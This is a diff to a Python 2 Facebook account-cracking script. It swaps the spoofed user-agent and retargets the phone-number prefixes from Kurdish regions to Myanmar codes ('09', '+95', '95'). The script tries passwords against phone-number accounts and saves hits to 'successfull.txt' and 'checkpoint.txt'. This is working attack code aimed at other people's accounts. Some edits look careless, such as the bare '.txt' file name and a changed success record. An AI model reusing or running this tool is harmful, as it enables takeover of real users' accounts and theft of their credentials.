@@ -27,6 +27,7 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+br.addheaders = [('user-agent', 'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.87 Mobile Safari/537.36')]
 
 def exb():
     print '[!] Exit'
@@ -70,9 +71,9 @@ def menu():
     os.system('clear')
     print logo
     print 42 * '\x1b[1;91m='
-    print '\x1b[1;94m[1] Kurdistan\x1B[1;31m Crack '
-    print '\x1b[1;94m[2] Slemani\x1b[1;32m Crack '
-    print '\x1b[1;94m[3] Erbil\x1b[1;33m Crack '
+    print '\x1b[1;94m[1] Mandalay\x1B[1;31m Crack '
+    print '\x1b[1;94m[2] Yangon\x1b[1;32m Crack '
+    print '\x1b[1;94m[3] Asia\x1b[1;33m Crack '
 
     print 42 * '\x1b[1;91m='
     action()
@@ -106,7 +107,7 @@ def action():
         print '\x1b[1;99m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
         try:
             c = raw_input(' Zhmarayak Dabne:) ')
-            k = ''
+            k = '09'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
@@ -121,7 +122,7 @@ def action():
         print '\x1b[1;99m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
         try:
             c = raw_input(' Zhmarayak Dabne:) ')
-            k = ''
+            k = '+95'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
@@ -130,7 +131,21 @@ def action():
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             menu()
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print '\x1b[1;99m 770 - 771 - 772 \n 750 - 751 - 752 \n 780 - 781 - 782'
+        try:
+            c = raw_input(' Zhmarayak Dabne:) ')
+            k = '95'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
 
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
 
     elif bch == '0':
         exb()
@@ -162,7 +177,7 @@ def action():
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
-                oks.append(c + user + pass1)
+                oks.append(k + c + pass1)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;92m[Sutawa]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
